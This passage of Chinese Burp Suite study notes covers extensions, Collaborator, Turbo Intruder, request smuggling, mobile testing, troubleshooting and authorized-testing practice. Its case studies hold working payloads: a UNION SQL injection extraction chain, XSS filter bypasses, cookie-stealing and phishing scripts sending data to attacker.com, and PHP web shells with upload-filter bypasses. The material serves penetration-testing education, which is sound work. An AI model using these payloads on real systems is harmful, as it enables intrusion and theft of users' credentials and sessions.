响应1: 403 Forbidden

请求2: 管理员访问 /admin
响应2: 200 OK + 管理页面

比较确认权限控制正常

场景4：缓存投毒检测
请求1: 正常请求
请求2: 带有恶意 Header 的请求

比较响应，检查恶意内容是否被缓存
```


---

## 11. 扩展模块 (Extender)

### 11.1 Extender 概述

Extender 允许通过插件扩展 Burp Suite 的功能。BApp Store 提供了大量社区开发的扩展，也可以自己编写扩展。

### 11.2 BApp Store

```
Extender → BApp Store

热门扩展推荐：

1. Logger++ 
   - 增强的日志记录
   - 高级过滤和搜索
   - 导出日志

2. Autorize
   - 自动化授权测试
   - 检测越权漏洞
   - 比较不同用户的响应

3. Turbo Intruder
   - 超高速 Intruder
   - Python 脚本控制
   - 适合大规模测试

4. JSON Web Tokens (JWT)
   - JWT 解析和编辑
   - 签名验证
   - 攻击向量测试

5. Param Miner
   - 发现隐藏参数
   - 缓存投毒测试
   - Web 缓存欺骗

6. Hackvertor
   - 高级编码转换
   - 自定义标签
   - 动态编码

7. Active Scan++
   - 增强主动扫描
   - 更多检测规则
   - 减少漏报

8. Retire.js
   - 检测过时的 JavaScript 库
   - 已知漏洞提醒

9. Software Vulnerability Scanner
   - 检测软件版本漏洞
   - CVE 关联

10. CSRF Scanner
    - 自动检测 CSRF 漏洞
    - 生成 PoC
```

### 11.3 安装扩展

```
方法1：从 BApp Store 安装
Extender → BApp Store → 选择扩展 → Install

方法2：手动安装
Extender → Extensions → Add
- Extension type: Java / Python / Ruby
- Extension file: 选择 .jar 或 .py 文件

Python 扩展需要配置 Jython：
Extender → Options → Python Environment
- Location of Jython standalone JAR file: 选择 jython-standalone.jar

Ruby 扩展需要配置 JRuby：
Extender → Options → Ruby Environment
- Location of JRuby JAR file: 选择 jruby.jar
```

### 11.4 编写自定义扩展

```python
# 简单的 Python 扩展示例
# 功能：记录所有包含密码的请求

from burp import IBurpExtender
from burp import IHttpListener
import re

class BurpExtender(IBurpExtender, IHttpListener):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        
        # 设置扩展名称
        callbacks.setExtensionName("Password Logger")
        
        # 注册 HTTP 监听器
        callbacks.registerHttpListener(self)
        
        print("Password Logger extension loaded")
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        # 只处理请求
        if not messageIsRequest:
            return
        
        # 获取请求信息
        request = messageInfo.getRequest()
        requestInfo = self._helpers.analyzeRequest(request)
        
        # 获取请求体
        bodyOffset = requestInfo.getBodyOffset()
        body = request[bodyOffset:].tostring()
        
        # 检查是否包含密码参数
        if re.search(r'password=', body, re.IGNORECASE):
            url = requestInfo.getUrl()
            print("[!] Password found in request to: " + str(url))
            print("    Body: " + body[:100])
```

```java
// Java 扩展示例
// 功能：自动添加自定义 Header

package burp;

public class BurpExtender implements IBurpExtender, IHttpListener {
    
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    
    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        
        callbacks.setExtensionName("Custom Header Adder");
        callbacks.registerHttpListener(this);
    }
    
    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, 
                                   IHttpRequestResponse messageInfo) {
        if (messageIsRequest) {
            // 获取当前请求
            byte[] request = messageInfo.getRequest();
            IRequestInfo requestInfo = helpers.analyzeRequest(request);
            
            // 添加自定义 Header
            List<String> headers = new ArrayList<>(requestInfo.getHeaders());
            headers.add("X-Custom-Header: BurpExtension");
            
            // 重建请求
            byte[] body = Arrays.copyOfRange(request, 
                requestInfo.getBodyOffset(), request.length);
            byte[] newRequest = helpers.buildHttpMessage(headers, body);
            
            messageInfo.setRequest(newRequest);
        }
    }
}
```


---

## 12. 高级技巧

### 12.1 Burp Collaborator

Burp Collaborator 是一个外部服务器，用于检测带外（Out-of-Band）漏洞。

```
使用场景：
- 盲 SSRF
- 盲 XXE
- 盲 SQL 注入
- DNS 数据外带
- 邮件注入

使用方法：
1. 生成 Collaborator payload：
   Burp → Burp Collaborator client
   点击 "Copy to clipboard"
   
   获得类似：xyz123.burpcollaborator.net

2. 在测试中使用：
   <!-- XXE 测试 -->
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "http://xyz123.burpcollaborator.net">
   ]>
   <foo>&xxe;</foo>

3. 检查交互：
   点击 "Poll now" 查看是否有请求到达
   
   如果有 DNS/HTTP 请求记录，说明漏洞存在

私有 Collaborator 服务器：
- 可以部署自己的 Collaborator 服务器
- Project options → Misc → Burp Collaborator Server
- 配置自定义服务器地址
```

### 12.2 宏和会话处理

```
Project options → Sessions → Session Handling Rules

场景：自动处理登录会话

1. 创建登录宏：
   - Add → Macros → Add
   - 选择登录请求序列
   - 配置参数提取（如 CSRF token）

2. 创建会话处理规则：
   - Add → Session handling rules → Add
   - Rule actions: Run a macro
   - 选择登录宏
   
3. 配置触发条件：
   - Scope: 作用域内的请求
   - Tools: 选择适用的工具
   - URL scope: 匹配的 URL

示例：自动刷新 CSRF Token

宏配置：
1. 请求获取表单页面
2. 提取 CSRF token（使用正则或 HTML 解析）
3. 将 token 存储为会话变量

规则配置：
1. 在每个请求前运行宏
2. 用新 token 替换请求中的旧 token
```

### 12.3 Turbo Intruder

Turbo Intruder 是一个高性能的 Intruder 替代品，使用 Python 脚本控制。

```python
# 基础用法
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=100,
                          pipeline=True)
    
    for word in open('/path/to/wordlist.txt'):
        engine.queue(target.req, word.rstrip())

def handleResponse(req, interesting):
    if '200 OK' in req.response:
        table.add(req)
```

```python
# 竞态条件测试
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)
    
    # 同时发送多个请求
    for i in range(30):
        engine.queue(target.req, gate='race1')
    
    # 同时释放所有请求
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

```python
# 暴力破解优化
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=100,
                          requestsPerConnection=1000,
                          pipeline=True)
    
    # 使用内置字典
    for word in wordlists.clipboard:
        engine.queue(target.req, word)

def handleResponse(req, interesting):
    # 根据响应长度过滤
    if len(req.response) != 4521:
        table.add(req)
```

### 12.4 HTTP Request Smuggling

```
检测请求走私漏洞：

1. CL.TE 检测：
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

2. TE.CL 检测：
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


使用 Burp 扩展：
- HTTP Request Smuggler
- 自动检测走私漏洞
- 生成利用 payload
```

### 12.5 移动应用测试

```
配置移动设备代理：

Android 设备：
1. 确保设备和电脑在同一网络
2. 获取电脑 IP 地址
3. Burp 监听器绑定到所有接口（0.0.0.0:8080）
4. 设备 WiFi 设置 → 手动代理 → 电脑IP:8080
5. 安装 Burp CA 证书到设备

iOS 设备：
1. 同上配置代理
2. Safari 访问 http://burp 下载证书
3. 设置 → 通用 → 描述文件 → 安装证书
4. 设置 → 通用 → 关于 → 证书信任设置 → 启用

证书固定绕过：
- 使用 Frida 脚本
- 使用 Objection 工具
- 修改 APK/IPA

Android 证书固定绕过（Frida）：
frida -U -f com.example.app -l ssl-pinning-bypass.js --no-pause

常见问题：
- Android 7+ 默认不信任用户证书
- 需要 root 或修改 APK 的 network_security_config
```

### 12.6 API 测试技巧

```
REST API 测试：

1. 发现 API 端点：
   - 分析 JavaScript 文件
   - 查看网络请求
   - 尝试常见路径（/api, /v1, /graphql）

2. 认证测试：
   - 测试无认证访问
   - 测试过期 Token
   - 测试其他用户的 Token

3. 授权测试：
   - 水平越权（访问其他用户数据）
   - 垂直越权（访问管理功能）
   - IDOR（不安全的直接对象引用）

4. 输入验证：
   - 参数篡改
   - 类型混淆（字符串→数组）
   - 大数值/负数
   - 特殊字符

GraphQL 测试：

1. 内省查询：
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}

2. 批量查询攻击：
[
  {"query": "{ user(id: 1) { password } }"},
  {"query": "{ user(id: 2) { password } }"},
  ...
]

3. 深度查询攻击：
{
  user {
    friends {
      friends {
        friends {
          # 深度嵌套导致 DoS
        }
      }
    }
  }
}
```


---

## 13. 实战案例

### 13.1 案例：完整的 Web 应用渗透测试流程

```
目标：example.com（已获得授权）

阶段1：信息收集
1. 配置作用域
   Target → Scope → Add: *.example.com

2. 被动爬取
   - 浏览网站所有功能
   - 查看 Site map 构建情况

3. 主动爬取
   - 配置登录凭据
   - 启动 Crawler

4. 分析站点地图
   - 识别关键功能点
   - 标记敏感接口

阶段2：漏洞扫描
1. 被动扫描
   - 检查已发现的问题
   - 分析敏感信息泄露

2. 主动扫描
   - 对关键功能进行扫描
   - 重点关注输入点

3. 分析扫描结果
   - 验证高危漏洞
   - 排除误报

阶段3：手动测试
1. 认证测试
   - 暴力破解
   - 密码重置流程
   - 会话管理

2. 授权测试
   - 越权访问
   - IDOR
   - 功能级访问控制

3. 输入验证
   - SQL 注入
   - XSS
   - 命令注入
   - 文件上传

4. 业务逻辑
   - 流程绕过
   - 竞态条件
   - 价格篡改

阶段4：报告
1. 导出扫描报告
2. 整理手动发现
3. 编写漏洞详情
4. 提供修复建议
```

### 13.2 案例：SQL 注入完整利用

```
发现点：商品详情页
URL: /product?id=1

步骤1：确认注入
GET /product?id=1' HTTP/1.1
响应：SQL syntax error

GET /product?id=1'-- HTTP/1.1
响应：正常页面

结论：存在 SQL 注入

步骤2：确定数据库类型
GET /product?id=1' AND 'a'='a HTTP/1.1  → MySQL
GET /product?id=1' AND 1=1-- HTTP/1.1   → 通用

步骤3：确定列数
GET /product?id=1' ORDER BY 1-- HTTP/1.1  → 正常
GET /product?id=1' ORDER BY 5-- HTTP/1.1  → 正常
GET /product?id=1' ORDER BY 6-- HTTP/1.1  → 错误
结论：5列

步骤4：确定回显位置
GET /product?id=-1' UNION SELECT 1,2,3,4,5-- HTTP/1.1
页面显示：2, 4
结论：第2、4列有回显

步骤5：提取数据库信息
GET /product?id=-1' UNION SELECT 1,version(),3,database(),5-- HTTP/1.1
结果：MySQL 8.0.28, shop_db

步骤6：提取表名
GET /product?id=-1' UNION SELECT 1,group_concat(table_name),3,4,5 
FROM information_schema.tables WHERE table_schema='shop_db'-- HTTP/1.1
结果：users, products, orders

步骤7：提取列名
GET /product?id=-1' UNION SELECT 1,group_concat(column_name),3,4,5 
FROM information_schema.columns WHERE table_name='users'-- HTTP/1.1
结果：id, username, password, email, role

步骤8：提取数据
GET /product?id=-1' UNION SELECT 1,group_concat(username,':',password),3,4,5 
FROM users-- HTTP/1.1
结果：admin:5f4dcc3b5aa765d61d8327deb882cf99

步骤9：破解密码
MD5 解密：password
```

### 13.3 案例：XSS 漏洞利用

```
发现点：搜索功能
URL: /search?q=test

步骤1：确认反射
GET /search?q=test123unique HTTP/1.1
响应中包含：test123unique
结论：输入被反射

步骤2：测试过滤
GET /search?q=<script> HTTP/1.1
响应：<script> 被过滤为空

GET /search?q=<img> HTTP/1.1
响应：<img> 保留

步骤3：构造 Payload
GET /search?q=<img src=x onerror=alert(1)> HTTP/1.1
响应：弹窗！

步骤4：绕过更严格的过滤
# 大小写绕过
<ImG sRc=x oNeRrOr=alert(1)>

# 编码绕过
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

# 事件处理器变体
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>

步骤5：窃取 Cookie
<script>
new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>

步骤6：构造钓鱼
<script>
document.body.innerHTML='<form action="http://attacker.com/phish" method="POST">'+
'<input name="user" placeholder="Username">'+
'<input name="pass" type="password" placeholder="Password">'+
'<button>Login</button></form>';
</script>
```

### 13.4 案例：越权漏洞测试

```
场景：用户资料修改功能

步骤1：正常请求分析
POST /api/user/profile HTTP/1.1
Host: example.com
Cookie: session=user_a_session
Content-Type: application/json

{"user_id": 1001, "name": "User A", "email": "usera@test.com"}

响应：{"status": "success"}

步骤2：水平越权测试
# 使用 User A 的会话修改 User B 的资料
POST /api/user/profile HTTP/1.1
Host: example.com
Cookie: session=user_a_session
Content-Type: application/json

{"user_id": 1002, "name": "Hacked", "email": "hacked@test.com"}

响应：{"status": "success"}  ← 越权成功！

步骤3：垂直越权测试
# 普通用户尝试访问管理接口
GET /api/admin/users HTTP/1.1
Host: example.com
Cookie: session=normal_user_session

响应：{"users": [...]}  ← 越权成功！

步骤4：使用 Autorize 扩展自动化测试
1. 安装 Autorize 扩展
2. 配置低权限用户的 Cookie
3. 浏览高权限用户的功能
4. Autorize 自动对比响应差异
5. 标记可能的越权点

步骤5：IDOR 测试
# 原始请求
GET /api/orders/12345 HTTP/1.1

# 修改 ID 尝试访问其他订单
GET /api/orders/12346 HTTP/1.1
GET /api/orders/12344 HTTP/1.1

# 使用 Intruder 批量测试
GET /api/orders/§12345§ HTTP/1.1
Payload: Numbers 12300-12400
```

### 13.5 案例：文件上传漏洞

```
场景：头像上传功能

步骤1：正常上传分析
POST /upload/avatar HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="avatar.jpg"
Content-Type: image/jpeg

[JPEG 文件内容]
------WebKitFormBoundary--

响应：{"url": "/uploads/avatar_123.jpg"}

步骤2：测试文件类型限制
# 直接上传 PHP
filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>

响应：{"error": "File type not allowed"}

步骤3：绕过技术

# 3.1 双扩展名
filename="shell.php.jpg"
filename="shell.jpg.php"

# 3.2 大小写绕过
filename="shell.pHp"
filename="shell.PHP"

# 3.3 特殊扩展名
filename="shell.php5"
filename="shell.phtml"
filename="shell.phar"

# 3.4 空字节截断（旧版本）
filename="shell.php%00.jpg"
filename="shell.php\x00.jpg"

# 3.5 Content-Type 绕过
filename="shell.php"
Content-Type: image/jpeg

# 3.6 文件头绕过
GIF89a<?php system($_GET['cmd']); ?>

# 3.7 .htaccess 上传
filename=".htaccess"
AddType application/x-httpd-php .jpg

步骤4：验证上传成功
访问：/uploads/shell.php?cmd=whoami
响应：www-data

步骤5：使用 Intruder 批量测试扩展名
filename="shell.§php§"
Payload: php, php5, phtml, phar, php7, phps, pht
```

---

## 14. 常见错误与解决方案

### 14.1 代理配置问题

```
问题1：浏览器无法连接到 Burp 代理

症状：
- 浏览器显示"代理服务器拒绝连接"
- 无法访问任何网站

解决方案：
1. 确认 Burp 已启动且代理监听器正在运行
   Proxy → Options → Proxy Listeners
   确保有监听器且状态为 "Running"

2. 检查监听地址和端口
   默认：127.0.0.1:8080
   确保浏览器代理设置与此一致

3. 检查防火墙设置
   Windows: 允许 Burp 通过防火墙
   Linux: 检查 iptables 规则

4. 尝试重启 Burp 和浏览器

5. 检查是否有其他程序占用 8080 端口
   Windows: netstat -ano | findstr 8080
   Linux: lsof -i :8080
```

```
问题2：HTTPS 网站显示证书错误

症状：
- 浏览器显示"您的连接不是私密连接"
- NET::ERR_CERT_AUTHORITY_INVALID

解决方案：
1. 安装 Burp CA 证书
   - 访问 http://burp 下载证书
   - 按照 2.4 节的步骤安装

2. Firefox 用户注意
   - Firefox 使用独立证书存储
   - 需要在 Firefox 中单独导入证书

3. 证书已安装但仍报错
   - 检查证书是否在"受信任的根证书颁发机构"
   - 尝试重新生成 Burp CA 证书
     Proxy → Options → Regenerate CA certificate
   - 重新安装新证书

4. 某些网站仍然报错
   - 可能使用了证书固定 (Certificate Pinning)
   - 需要使用特殊工具绕过
```

```
问题3：部分请求没有被拦截

症状：
- 某些请求直接通过，没有在 Intercept 中显示
- HTTP history 中也没有记录

解决方案：
1. 检查拦截规则
   Proxy → Options → Intercept Client Requests
   确保规则没有排除目标请求

2. 检查作用域设置
   如果启用了"仅拦截作用域内请求"
   确保目标在作用域内

3. 检查 TLS 直通设置
   Proxy → Options → TLS Pass Through
   某些主机可能被配置为直通

4. WebSocket 请求
   WebSocket 消息在单独的标签页
   Proxy → WebSockets history
```

### 14.2 扫描器问题

```
问题4：扫描速度很慢

症状：
- 扫描进度缓慢
- CPU/内存占用高

解决方案：
1. 调整扫描配置
   - 使用 "Fast" 或 "Fastest" 优化级别
   - 减少检测项目
   - 限制扫描深度

2. 增加 Burp 内存
   编辑启动脚本，增加 -Xmx 参数
   java -Xmx4g -jar burpsuite_pro.jar

3. 限制并发连接
   Project options → Connections
   减少并发连接数

4. 排除不必要的内容
   - 排除静态资源
   - 排除第三方域名
   - 缩小作用域

5. 使用 SSD 硬盘
   项目文件读写更快
```

```
问题5：扫描器漏报/误报

症状：
- 已知漏洞未被检测到
- 报告的漏洞实际不存在

解决方案：
1. 漏报处理
   - 使用 "Thorough" 扫描级别
   - 启用所有检测项
   - 手动测试关键功能
   - 使用多种工具交叉验证

2. 误报处理
   - 手动验证每个发现
   - 使用 Repeater 重放请求
   - 检查响应确认漏洞存在
   - 标记误报以改进扫描器

3. 提高准确性
   - 配置正确的登录会话
   - 设置合适的作用域
   - 排除登出链接
```

```
问题6：扫描导致应用崩溃

症状：
- 目标应用变慢或无响应
- 数据库被大量测试数据污染

解决方案：
1. 降低扫描强度
   - 减少并发连接
   - 增加请求间隔
   - 使用 "Minimize false negatives" 设置

2. 与开发团队协调
   - 在测试环境进行扫描
   - 准备数据恢复方案
   - 监控应用状态

3. 排除危险操作
   - 排除删除接口
   - 排除支付接口
   - 排除发送邮件/短信的接口

4. 使用只读扫描
   - 仅使用 GET 请求
   - 禁用表单提交
```

### 14.3 Intruder 问题

```
问题7：Intruder 攻击速度慢（社区版）

症状：
- 请求发送速度被限制
- 攻击需要很长时间

解决方案：
1. 升级到专业版
   - 专业版无速度限制
   - 支持更多并发

2. 使用替代工具
   - Turbo Intruder 扩展
   - ffuf
   - wfuzz
   - hydra（密码破解）

3. 优化 payload
   - 使用更精简的字典
   - 按可能性排序
   - 去除重复项
```

```
问题8：Intruder 结果难以分析

症状：
- 大量结果不知道哪个成功
- 无法快速识别有效 payload

解决方案：
1. 使用 Grep Match
   - 配置成功/失败的标志字符串
   - 如 "Login successful" / "Invalid password"

2. 关注响应差异
   - 按响应长度排序
   - 按状态码排序
   - 按响应时间排序

3. 使用 Grep Extract
   - 提取关键信息
   - 如错误消息、token 等

4. 添加基准请求
   - 启用 "Make unmodified baseline request"
   - 对比基准响应
```

### 14.4 会话管理问题

```
问题9：测试过程中会话失效

症状：
- 请求返回 401/403
- 被重定向到登录页面
- 扫描中断

解决方案：
1. 配置会话处理规则
   Project options → Sessions → Session Handling Rules
   
   创建规则：
   - 检测会话失效（如响应包含 "Please login"）
   - 自动执行登录宏
   - 更新会话 Cookie

2. 使用登录宏
   - 录制完整登录流程
   - 提取并更新 CSRF token
   - 配置触发条件

3. 延长会话超时
   - 与开发协调延长测试账号的会话时间
   - 或定期手动刷新会话

4. 排除登出链接
   - 在作用域中排除 /logout
   - 避免意外触发登出
```

```
问题10：CSRF Token 导致请求失败

症状：
- 修改后的请求返回 "Invalid token"
- Intruder 攻击全部失败

解决方案：
1. 配置宏自动获取 Token
   - 创建宏请求包含 token 的页面
   - 使用正则提取 token
   - 在会话规则中更新请求

2. 使用 Burp 扩展
   - CSRF Token Tracker
   - 自动处理 token 更新

3. 手动处理
   - 每次测试前获取新 token
   - 在 Repeater 中手动更新

示例宏配置：
1. 宏请求：GET /form（包含 CSRF token）
2. 提取规则：name="csrf_token" value="([^"]+)"
3. 会话规则：用提取的值替换请求中的 csrf_token 参数
```

### 14.5 扩展问题

```
问题11：Python 扩展无法加载

症状：
- 扩展加载失败
- 错误信息提示 Jython 问题

解决方案：
1. 配置 Jython
   Extender → Options → Python Environment
   下载 jython-standalone-2.7.x.jar
   配置 JAR 文件路径

2. 检查 Python 版本兼容性
   - Jython 支持 Python 2.7 语法
   - 不支持 Python 3 语法
   - 修改扩展代码适配

3. 检查依赖
   - 某些扩展需要额外的库
   - 查看扩展文档了解依赖

4. 内存不足
   - 增加 Burp 内存分配
   - 减少同时加载的扩展数量
```

```
问题12：扩展导致 Burp 崩溃

症状：
- 加载扩展后 Burp 无响应
- 频繁崩溃

解决方案：
1. 禁用问题扩展
   - 启动时按住 Shift 键
   - 选择禁用所有扩展启动
   - 逐个启用找出问题扩展

2. 更新扩展
   - 检查是否有新版本
   - 查看扩展的 issue 列表

3. 检查扩展兼容性
   - 确认扩展支持当前 Burp 版本
   - 某些旧扩展可能不兼容新版

4. 报告问题
   - 向扩展开发者报告 bug
   - 提供错误日志和复现步骤
```

### 14.6 性能问题

```
问题13：Burp 占用大量内存

症状：
- 内存使用持续增长
- 系统变慢
- OutOfMemoryError

解决方案：
1. 增加内存分配
   编辑启动命令：
   java -Xmx8g -jar burpsuite_pro.jar

2. 定期清理历史
   - 删除不需要的 HTTP history
   - 清理 Site map 中的无关内容
   - 定期保存并新建项目

3. 优化设置
   - 减少保存的响应大小
   - 禁用不需要的被动扫描
   - 限制历史记录数量

4. 使用临时项目
   - 对于简单测试使用临时项目
   - 避免项目文件过大
```

```
问题14：项目文件过大

症状：
- 项目文件达到数 GB
- 加载/保存很慢

解决方案：
1. 分割项目
   - 按目标或阶段创建多个项目
   - 避免单个项目过大

2. 清理数据
   - 删除不需要的历史记录
   - 清理扫描结果
   - 移除大型响应

3. 导出重要数据
   - 导出关键发现
   - 导出报告
   - 然后新建项目继续

4. 使用 SSD
   - 项目文件存储在 SSD 上
   - 显著提升读写速度
```

### 14.7 网络问题

```
问题15：无法连接到目标服务器

症状：
- 请求超时
- Connection refused
- 无法解析主机名

解决方案：
1. 检查网络连接
   - 确认可以直接访问目标（不通过 Burp）
   - 检查 DNS 解析
   - 检查防火墙设置

2. 检查上游代理
   User options → Connections → Upstream Proxy Servers
   - 如果需要通过公司代理，配置上游代理
   - 检查代理认证信息

3. 检查 SOCKS 代理
   User options → Connections → SOCKS Proxy
   - 如果使用 Tor 或 VPN，配置 SOCKS 代理

4. DNS 设置
   Project options → Connections → Hostname Resolution
   - 添加自定义 DNS 解析
   - 解决内网域名解析问题

5. TLS 问题
   Project options → TLS
   - 尝试不同的 TLS 版本
   - 禁用不支持的加密套件
```

```
问题16：响应乱码

症状：
- 响应内容显示乱码
- 中文等非 ASCII 字符无法正常显示

解决方案：
1. 检查响应编码
   - 查看 Content-Type 头中的 charset
   - 如：Content-Type: text/html; charset=utf-8

2. 设置显示编码
   - 在响应面板右键
   - 选择合适的编码（UTF-8, GBK 等）

3. 使用 Render 视图
   - 切换到 Render 标签
   - 浏览器引擎会自动处理编码

4. 检查是否压缩
   - 响应可能是 gzip 压缩的
   - Burp 通常自动解压
   - 检查 Content-Encoding 头
```

### 14.8 常见操作错误

```
问题17：误删重要数据

症状：
- 不小心删除了关键请求
- 清空了 HTTP history

预防措施：
1. 定期保存项目
   - Ctrl + S 保存
   - 设置自动保存

2. 使用注释和高亮
   - 标记重要请求
   - 添加注释说明

3. 导出关键数据
   - 右键 → Save item
   - 导出为文件备份

4. 使用版本控制
   - 定期备份项目文件
   - 使用不同文件名保存阶段性成果

恢复方法：
- 如果项目已保存，重新加载
- 如果是临时项目，数据无法恢复
- 养成保存习惯！
```

```
问题18：测试影响了生产环境

症状：
- 测试数据出现在生产系统
- 用户收到测试邮件/短信
- 数据被意外修改或删除

预防措施：
1. 确认测试环境
   - 始终在测试/预发布环境测试
   - 双重确认目标 URL

2. 配置作用域
   - 严格限制测试范围
   - 排除生产域名

3. 排除危险操作
   - 排除删除接口
   - 排除发送通知的接口
   - 排除支付接口

4. 使用测试账号
   - 不使用真实用户账号
   - 使用专门的测试数据

5. 与团队沟通
   - 通知相关人员测试计划
   - 准备回滚方案
```

```
问题19：忘记关闭拦截

症状：
- 浏览器一直加载中
- 页面无法打开
- 其他应用网络请求失败

解决方案：
1. 检查拦截状态
   Proxy → Intercept
   确保 "Intercept is off" 或及时 Forward

2. 使用快捷键
   Ctrl + T 快速切换拦截状态

3. 配置拦截规则
   - 只拦截需要的请求
   - 排除静态资源
   - 排除非目标域名

4. 测试完成后
   - 关闭拦截
   - 或关闭浏览器代理
   - 或关闭 Burp
```

### 14.9 报告问题

```
问题20：导出报告失败

症状：
- 报告生成卡住
- 导出的报告不完整
- 格式错误

解决方案：
1. 检查磁盘空间
   - 确保有足够空间保存报告
   - 大型项目报告可能很大

2. 减少报告内容
   - 只导出需要的漏洞
   - 限制请求/响应大小
   - 分批导出

3. 尝试不同格式
   - HTML 格式最完整
   - XML 格式适合程序处理
   - 如果一种格式失败，尝试另一种

4. 更新 Burp
   - 某些报告问题在新版本中修复
   - 保持 Burp 更新

5. 手动整理
   - 如果自动报告有问题
   - 手动复制关键信息
   - 使用截图补充
```

---

## 15. 快捷键速查表

```
全局快捷键：
Ctrl + Shift + T    发送到 Target
Ctrl + Shift + P    发送到 Proxy
Ctrl + Shift + I    发送到 Intruder
Ctrl + Shift + R    发送到 Repeater
Ctrl + Shift + S    发送到 Scanner
Ctrl + Shift + O    发送到 Organizer
Ctrl + Shift + D    发送到 Decoder
Ctrl + Shift + C    发送到 Comparer

Proxy 快捷键：
Ctrl + F            Forward（放行）
Ctrl + D            Drop（丢弃）
Ctrl + T            Toggle intercept（切换拦截）

Repeater 快捷键：
Ctrl + Space        发送请求
Ctrl + +            新建标签页
Ctrl + -            关闭标签页

搜索快捷键：
Ctrl + F            在当前面板搜索
Ctrl + Shift + F    全局搜索

编辑快捷键：
Ctrl + U            URL 编码选中内容
Ctrl + Shift + U    URL 解码选中内容
Ctrl + B            Base64 编码选中内容
Ctrl + Shift + B    Base64 解码选中内容

其他：
Ctrl + S            保存项目
Ctrl + Z            撤销
Ctrl + Y            重做
```

---

## 16. 最佳实践总结

### 16.1 测试前准备

```
1. 获取授权
   - 书面授权文件
   - 明确测试范围
   - 紧急联系人

2. 环境准备
   - 确认测试环境（非生产）
   - 准备测试账号
   - 了解应用架构

3. Burp 配置
   - 配置作用域
   - 安装必要扩展
   - 配置会话处理
   - 排除危险操作

4. 备份
   - 备份测试数据
   - 准备恢复方案
```

### 16.2 测试中注意事项

```
1. 循序渐进
   - 先被动收集信息
   - 再进行主动测试
   - 最后尝试利用

2. 记录一切
   - 使用注释功能
   - 截图保存证据
   - 记录测试步骤

3. 验证发现
   - 手动验证扫描结果
   - 排除误报
   - 确认漏洞可利用

4. 注意影响
   - 监控应用状态
   - 避免造成服务中断
   - 及时报告严重问题
```

### 16.3 测试后工作

```
1. 整理报告
   - 漏洞分类和评级
   - 详细复现步骤
   - 修复建议

2. 清理痕迹
   - 删除测试数据
   - 清理上传的文件
   - 通知管理员

3. 知识沉淀
   - 总结经验教训
   - 更新测试方法
   - 分享团队
```

---

## 总结

Burp Suite 是 Web 安全测试的瑞士军刀，掌握它需要大量实践。本笔记涵盖了从基础到高级的完整内容：

**核心模块：**
- Proxy：流量拦截和修改的基础
- Scanner：自动化漏洞检测
- Intruder：自动化定制攻击
- Repeater：手动测试的核心工具

**进阶技能：**
- 会话处理和宏
- Burp Collaborator
- 扩展开发
- 移动应用测试

**关键要点：**
1. 理解 HTTP 协议是基础
2. 熟练使用快捷键提高效率
3. 合理配置作用域和规则
4. 结合手动和自动测试
5. 始终在授权范围内测试

> "工具只是手段，思维才是核心。"
> 
> Burp Suite 再强大，也需要安全测试人员的专业知识和经验来发挥其价值。

---

*本笔记基于 Burp Suite Professional 2024 版本*
*持续更新中，欢迎补充和指正*
